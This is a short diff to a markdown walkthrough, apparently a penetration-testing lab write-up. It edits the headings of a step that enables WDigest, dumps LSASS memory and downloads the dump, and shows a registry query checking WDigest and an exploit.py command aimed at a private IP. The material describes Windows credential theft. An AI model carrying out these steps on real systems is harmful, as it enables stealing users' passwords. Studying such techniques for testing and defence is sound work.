@@ -53,9 +53,9 @@ python3 exploit.py http://192.168.20.135:8080/ msiexec.exe
 
 <hr />
 
-### 2. Next step we are enabling wdigest then dumping LSASS then downloading it
+### 2. Next step we are enabling `WDigest` -> then dumping `LSASS`, -> then downloading it
 
-a. is WDigest Enabled?
+a. Is WDigest Enabled?
 
 ```
 reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
